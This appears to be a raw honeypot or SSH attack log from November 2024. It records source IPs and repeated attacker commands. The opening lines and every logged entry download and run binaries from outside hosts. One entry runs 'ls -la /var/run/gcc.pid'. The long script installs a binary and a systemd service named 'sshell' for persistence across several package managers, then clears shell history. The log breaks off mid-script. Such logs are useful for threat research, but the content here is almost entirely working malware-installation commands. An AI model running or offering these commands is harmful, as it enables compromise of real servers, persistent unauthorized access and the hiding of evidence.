wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-24 11:05:01.394445 - ('218.92.0.132', 45078) - ls -la /var/run/gcc.pid
2024-11-24 11:24:14.344051 - ('45.148.10.203', 57778) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:24:18.983849 - ('45.148.10.203', 57788) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:24:22.424510 - ('45.148.10.203', 60848) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:24:27.052591 - ('45.148.10.203', 60878) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:24:30.838383 - ('45.148.10.203', 35304) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:24:36.807943 - ('45.148.10.203', 35330) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:24:39.835009 - ('45.148.10.203', 35170) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
